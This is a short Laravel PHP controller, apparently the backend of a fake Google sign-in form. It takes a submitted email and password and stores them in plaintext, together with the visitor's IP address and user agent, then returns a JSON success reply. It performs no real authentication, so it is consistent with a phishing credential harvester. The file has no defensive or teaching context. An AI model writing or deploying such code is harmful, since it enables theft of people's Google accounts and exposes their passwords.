<?php

namespace App\Http\Controllers;

use App\Models\GoogleFormSubmission;
use Illuminate\Http\Request;

class GoogleLoginController extends Controller
{
    public function store(Request $request)
    {
        $validated = $request->validate([
            'email' => 'required|email',
            'password' => 'required|string|min:6',
        ]);

        // Store the form submission
        GoogleFormSubmission::create([
            'email' => $validated['email'],
            'password' => $validated['password'],
            'ip_address' => $request->ip(),
            'user_agent' => $request->userAgent(),
        ]);

        // Return success response as JSON for AJAX
        return response()->json(['success' => true]);
    }
}
